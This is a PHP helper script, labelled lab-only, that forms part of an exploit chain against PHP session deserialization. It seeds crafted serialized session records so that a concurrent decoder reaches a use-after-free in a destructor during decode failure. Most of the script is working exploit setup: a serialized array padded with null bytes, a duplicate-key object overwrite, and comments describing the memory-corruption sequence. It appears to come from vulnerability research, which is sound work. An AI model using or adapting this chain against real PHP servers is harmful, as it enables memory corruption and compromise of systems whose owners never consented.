<?php
/*
 * LAB-ONLY race helper: persist a *valid* session record under the configured
 * php_serialize handler, WITHOUT switching the handler.
 *
 * With cleanup=On the old /prime.php dummy progress record is erased at the
 * end of its own upload, so it cannot seed the second record that 8.4.27's
 * real var_destroy dtor (inv=2) needs. A normal session variable survives
 * cleanup. Its value starts with "|" followed by a valid serialized array:
 * the "php" decoder (used by the concurrent consumer) splits at that "|",
 * parses the valid array as record #1, then reaches the upload-progress
 * record's "|" and parses the exploit payload as record #2.
 *
 * /seed.php?d=1 writes the big valid dummy array used by /prime.php.
 * /seed.php?clear=1 destroys the session (reset between attempts).
 */
class CachePurge { public $key; public function __destruct() {} }

session_start();

if (isset($_GET['clear'])) {
    $_SESSION = [];
    session_destroy();
    echo "seed cleared\n";
    exit;
}

if (($_GET['d'] ?? '') === '1') {
    // Same shape as the /prime.php dummy: a valid a:1018 array that contains a
    // CachePurge object at i:99999, overwritten by i:99999;i:42. Parsing it as
    // record #1 queues a dry dtor (inv=1); the exploit record's object is then
    // inv=2 -- the decode-failure var_destroy dtor where the UAF lives.
    $blob = str_repeat("\x00", 0x1000);
    $val = 'a:1018:{i:0;s:4096:"' . $blob . '";'
         . str_repeat('i:0;N;', 1015)
         . 'i:99999;O:10:"CachePurge":1:{s:3:"key";s:8:"'
         . str_repeat("\x00", 8) . '";}'
         . 'i:99999;i:42;}';
    $_SESSION['seed_d'] = '|' . $val;
} else {
    // Minimal valid first record.
    $_SESSION['seed'] = '|i:1;';
}

session_write_close();
echo "seed ok\n";
